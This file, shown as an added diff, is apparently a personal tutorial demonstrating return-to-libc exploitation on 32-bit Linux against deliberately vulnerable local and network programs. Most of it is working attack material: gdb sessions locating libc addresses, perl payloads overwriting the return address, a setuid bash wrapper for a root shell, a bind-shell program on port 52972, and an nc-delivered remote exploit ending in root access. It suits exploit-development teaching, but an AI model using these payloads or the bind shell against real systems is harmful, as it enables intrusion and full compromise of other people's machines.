@@ -1,0 +1,342 @@
+Jeremy Brown [0xjbrown41@gmail.com/jbrownsec.blogspot.com]
+
+Return To LIBC Exploitation Demonstration [LINUX]
+
+*** Good technique for exploiting targets with small buffers and/or bypassing a non-executable stack. ***
+
+[PART 1 + LOCAL][PART 1 + LOCAL][PART 1 + LOCAL][PART 1 + LOCAL][PART 1 + LOCAL][PART 1 + LOCAL]
+
+bugs@linux:~$ cat bof.c
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+
+char buf[1024];
+
+if(argc < 2) { printf("usage: %s data\n", argv[0]); return 0; }
+
+     sprintf(buf, "%s", argv[1]);
+     printf("\n%s\n\n", buf);
+
+return 0;
+}
+
+bugs@linux:~$ gdb bof
+GNU gdb 6.5
+Copyright (C) 2006 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i486-linux-linux"...Using host libthread_db library "/lib/libthread_db.so.1".
+
+(gdb) `perl -e 'print "A" x 1036'`
+Undefined command: "".  Try "help".
+(gdb) r `perl -e 'print "A" x 1036'`
+Starting program: /home/bugs/bof `perl -e 'print "A" x 1036'`
+
+AAAA.....
+
+
+Program received signal SIGILL, Illegal instruction.
+0x40047200 in __libc_start_main () from /lib/libc.so.6
+(gdb) i r
+eax            0x0	0
+ecx            0x0	0
+edx            0x40f	1039
+ebx            0x4015bff0	1075167216
+esp            0xbffff1e0	0xbffff1e0
+ebp            0x41414141	0x41414141
+esi            0xbffff230	-1073745360
+edi            0x2	2
+eip            0x40047200	0x40047200 <__libc_start_main+16>
+eflags         0x10282	[ SF IF RF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x0	0
+(gdb) r `perl -e 'print "A" x 1040'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/bugs/bof `perl -e 'print "A" x 1040'`
+
+AAAA.....
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) break main
+Breakpoint 1 at 0x80483dd
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/bugs/bof `perl -e 'print "A" x 1040'`
+
+Breakpoint 1, 0x080483dd in main ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0x400684e0 <system>
+(gdb) p execl
+$1 = {<text variable, no debug info>} 0x400bf230 <execl>
+(gdb) x/100s $esi
+.....
+0xbffff2f7:	 ""
+0xbffff2f8:	 ""
+0xbffff2f9:	 "\203\004\b\v"
+---Type <return> to continue, or q <return> to quit---
+0xbffff2fe:	 ""
+0xbffff2ff:	 ""
+0xbffff300:	 "???\003"
+.....
+0xbffff335:	 "i686"
+0xbffff33a:	 "/home/bugs/bof"
+0xbffff349:	 'A' <repeats 200 times>...
+0xbffff411:	 'A' <repeats 200 times>...
+0xbffff4d9:	 'A' <repeats 200 times>...
+0xbffff5a1:	 'A' <repeats 200 times>...
+0xbffff669:	 'A' <repeats 200 times>...
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0x4005e110 <exit>
+(gdb) q
+The program is running.  Exit anyway? (y or n) y
+bugs@linux:~$
+
+We have our information, now we need to put it together.
+
+system() @ 0x400684e0 [\xe0\x84\x06\x40]
+execl()  @ 0x400bf230 [\x30\xf2\x0b\x40]
+exit()   @ 0x4005e110 [\x10\xe1\x05\x40]
+EIP overwrite-4 = 1036
+
+Remember, system() takes one argument and execl() takes three.
+
+Now we are going to debug a little around system() and find our groove. We can search 
+around 0xbffffxxxx for easy ones.
+
+`perl -e 'print "A" x 1036 . "\xe0\x84\x06\x40" . "DCBA" . "\xd0\xfe\xff\xbf";'`
+             junk data            system()        retaddr     system() arg
+
+bugs@linux:~$ ./bof `perl -e 'print "A" x 1036 . "\xe0\x84\x06\x40" . "DCBA" . "\xd0\xfe\xff\xbf";'`
+
+AAAA.....AAAA??????@DCBA????????????
+
+sh: /lib/java: No such file or directory
+Segmentation fault
+bugs@linux:~$ 
+
+Go up 5 bytes (/lib/java -> java)
+
+bugs@linux:~$ ./bof `perl -e 'print "A" x 1036 . "\xe0\x84\x06\x40" . "DCBA" . "\xd5\xfe\xff\xbf";'`
+
+AAAA.....AAAA??????@DCBA????????????
+
+Usage: java [-options] class [args...]
+           (to execute a class)
+   or  java [-options] -jar jarfile [args...]
+           (to execute a jar file)
+
+where options include:
+    -d32          use a 32-bit data model if available
+
+    -d64          use a 64-bit data model if available
+    -client	  to select the "client" VM
+    -server	  to select the "server" VM
+    -hotspot	  is a synonym for the "client" VM  [deprecated]
+                  The default VM is client.
+                  
+    -cp <class search path of directories and zip/jar files>
+    -classpath <class search path of directories and zip/jar files>
+                  A : separated list of directories, JAR archives,
+                  and ZIP archives to search for class files.
+    -D<name>=<value>
+                  set a system property
+    -verbose[:class|gc|jni]
+                  enable verbose output
+    -version      print product version and exit
+    -version:<value>
+                  require the specified version to run
+    -showversion  print product version and continue
+    -jre-restrict-search | -jre-no-restrict-search
+                  include/exclude user private JREs in the version search
+    -? -help      print this help message
+    -X            print help on non-standard options
+    -ea[:<packagename>...|:<classname>]
+    -enableassertions[:<packagename>...|:<classname>]
+                  enable assertions
+    -da[:<packagename>...|:<classname>]
+    -disableassertions[:<packagename>...|:<classname>]
+                  disable assertions
+    -esa | -enablesystemassertions
+                  enable system assertions
+    -dsa | -disablesystemassertions
+                  disable system assertions
+    -agentlib:<libname>[=<options>]
+                  load native agent library <libname>, e.g. -agentlib:hprof
+                    see also, -agentlib:jdwp=help and -agentlib:hprof=help
+    -agentpath:<pathname>[=<options>]
+                  load native agent library by full pathname
+    -javaagent:<jarpath>[=<options>]
+                  load Java programming language agent, see java.lang.instrument
+Segmentation fault
+bugs@linux:~$
+
+Great, now lets go one more byte (make it ava) and go on with this process.
+
+bugs@linux:~$ ./bof `perl -e 'print "A" x 1036 . "\xe0\x84\x06\x40" . "DCBA" . "\xd6\xfe\xff\xbf";'`
+
+AAAA.....AAAA??????@DCBA????????????
+
+sh: ava: command not found
+Segmentation fault
+bugs@linux:~$ cat sh.c
+int main() { setuid(0); setgid(0); system("/bin/bash"); }
+bugs@linux:~$ gcc -o ava sh.c
+bugs@linux:~$ ./bof `perl -e 'print "A" x 1036 . "\xe0\x84\x06\x40" . "DCBA" . "\xd6\xfe\xff\xbf";'`
+
+AAAA.....AAAA??????@DCBA????????????
+
+bash-3.1$ exit
+exit
+Segmentation fault
+bugs@linux:~$
+
+Nice work. But we want root shell, so lets use execl().
+
+`perl -e 'print "A" x 1036 . "\x30\xf2\x0b\x40" . "DCBA" . "\xd6\xfe\xff\xbf" x 3;'`
+             junk data            execl()         retaddr   "ava" (execl() args)
+
+bugs@linux:~$ ./bof `perl -e 'print "A" x 1036 . "\x30\xf2\x0b\x40" . "DCBA" . "\xd6\xfe\xff\xbf" x 3;'`
+
+AAAA.....AAAA0???
+   @DCBA????????????????????????????????????
+
+bash-3.1# exit
+exit
+bugs@linux:~$
+
+We can also use exit() as our return address to make things a little cleaner as well.
+
+`perl -e 'print "A" x 1036 . "\x30\xf2\x0b\x40" . "\x10\xe1\x05\x40" . "\xd6\xfe\xff\xbf" x 3;'`
+             junk data            execl()           retaddr (exit())    "ava" (execl() args)
+
+[PART 2 + REMOTE][PART 2 + REMOTE][PART 2 + REMOTE][PART 2 + REMOTE][PART 2 + REMOTE][PART 2 + REMOTE]
+
+[Terminal #1]
+
+bugs@linux:~$ cat serv.c
+#include <stdio.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+
+#define BUFFSZ 1024
+#define READSZ 2048
+
+int main(int argc, char *argv[])
+{
+
+if(argc < 2) { printf("Usage: %s port\n", argv[0]); return 0; }
+
+     int z, cli, serv, port = atoi(argv[1]);
+
+     struct sockaddr_in client, server;
+
+     server.sin_family      = AF_INET;
+     server.sin_port        = htons(port);
+     server.sin_addr.s_addr = INADDR_ANY;
+
+if((serv = socket(AF_INET, SOCK_STREAM, 0)) == -1) { printf("Error: socket()\n"); return -1; }
+
+if(bind(serv, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) { printf("Error: bind()\n"); return -1; }
+
+if(listen(serv, 10) == -1) { printf("Error: listen()\n"); return -1; }
+
+for(;;)
+{
+
+     cli = accept(serv, (struct sockaddr *)&client, &z);
+
+if(vulnerable(cli) == -1) { printf("Error: vulnerable()\n"); close(cli); }
+
+}
+
+     return 0;
+}
+
+int vulnerable(int sock)
+{
+
+     char buffer[BUFFSZ], readbuf[READSZ];
+
+     memset(buffer,  0, BUFFSZ);
+     memset(readbuf, 0, READSZ);
+
+     read(sock, readbuf, READSZ, 0);
+
+     sprintf(buffer, "%s", readbuf);
+
+     send(sock, buffer, BUFFSZ, 0);
+
+     close(sock);
+
+}
+
+bugs@linux:~$ cat bs.c
+#include <stdio.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+
+int main() { int z, cli, serv; struct sockaddr_in client, server; server.sin_family = AF_INET; server.sin_port = htons(52972); server.sin_addr.s_addr = INADDR_ANY;
+if((serv = socket(AF_INET, SOCK_STREAM, 0)) == -1) { printf("Error: socket()\n"); return -1; }
+if(bind(serv, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) { printf("Error: bind()\n"); return -1; }
+if(listen(serv, 10) == -1) { printf("Error: listen()\n"); return -1; }
+for(;;) { cli = accept(serv, (struct sockaddr *)&client, &z); dup2(cli, 0); dup2(cli, 1); dup2(cli, 2); execl("/bin/bash", "bash", 0); }
+return 0; }
+bugs@linux:~$ gcc -o serv serv.c
+bugs@linux:~$ gcc -o bs bs.c
+bugs@linux:~$ ./serv
+Usage: ./serv port
+bugs@linux:~$ ./serv 5555
+
+[Terminal #2]
+
+bugs@linux:~$ netstat -antp | grep LISTEN
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+tcp        0      0 0.0.0.0:37              0.0.0.0:*               LISTEN     -                   
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN     -                   
+tcp        0      0 0.0.0.0:113             0.0.0.0:*               LISTEN     -                   
+tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN     6110/serv           
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     -                   
+tcp        0      0 0.0.0.0:890             0.0.0.0:*               LISTEN     -         
+bugs@linux:~$ echo `perl -e 'print "A" x 1036 . "\xe0\x84\x06\x40" . "\x10\xe1\x05\x40" . "\xd0\xfe\xff\xbf";'` | nc localhost 5555
+
+[Terminal #1]
+
+sh: ib/java: No such file or directory
+bugs@linux:~$ cp bs ava
+root@linux:~# ./serv 5555
+
+[Terminal #2]
+
+bugs@linux:~$ echo `perl -e 'print "A" x 1036 . "\xe0\x84\x06\x40" . "\x10\xe1\x05\x40" . "\xd4\xfe\xff\xbf";'` | nc localhost 5555
+
+bugs@linux:~$ netstat -antp | grep LISTEN
+(No info could be read for "-p": geteuid()=1000 but you should be root.)
+tcp        0      0 0.0.0.0:37              0.0.0.0:*               LISTEN     -                   
+tcp        0      0 0.0.0.0:52972           0.0.0.0:*               LISTEN     -                   
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN     -                   
+tcp        0      0 0.0.0.0:113             0.0.0.0:*               LISTEN     -                   
+tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN     -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     -                   
+tcp        0      0 0.0.0.0:890             0.0.0.0:*               LISTEN     -                   
+bugs@linux:~$ nc localhost 52972
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+exit
+bugs@linux:~$
+
+Questions. Comments. Concerns. --> 0xjbrown41@gmail.com
